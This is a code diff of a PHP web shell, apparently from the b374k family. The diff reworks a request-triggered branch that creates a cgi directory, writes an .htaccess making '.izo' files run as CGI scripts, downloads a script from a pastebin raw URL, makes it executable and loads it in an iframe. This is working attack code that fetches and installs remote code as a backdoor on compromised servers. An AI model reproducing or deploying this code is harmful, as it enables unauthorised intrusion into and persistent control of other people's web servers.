@@ -162,16 +162,19 @@ echo "
 if(isset($_REQUEST["phpinfo"])) {
 phpinfo();
 }
-elseif(isset($_REQUEST["cgi"])) {
-	$cgi_dir=mkdir('cgi', 0755);
-	$file_cgi="cgi/cgi.izo";
-	$isi_htcgi="AddHandler cgi-script .izo";
-	$htcgi=fopen(".htaccess", "w");
-	$cgi_script=file_get_contents("https://pastebin.com/raw/MUD0EPjb");
-	$cgi=fopen($file_cgi, "w");
-	fwrite($cgi, $cgi_script);
+elseif(isset($_REQUEST['cgi'])) {
+$cgi_dir = mkdir('cgi', 0755);
+	$file_cgi = "cgi/cgi.izo";
+	$isi_htcgi = "AddHandler cgi-script .izo";
+	$htcgi = fopen("cgi/.htaccess", "w+");
 	fwrite($htcgi, $isi_htcgi);
+	fclose($htcgi);
+	$cgi_script =file_get_contents("https://pastebin.com/raw/MUD0EPjb");
+	$cgi = fopen($file_cgi, "w+");
+	fwrite($cgi, $cgi_script);
+	fclose($cgi);
 	chmod($file_cgi, 0755);
+	echo "<iframe src='cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
 }
 elseif(isset($_REQUEST["b374k"])) {
 $nama=fopen("jembud2.php", "w");
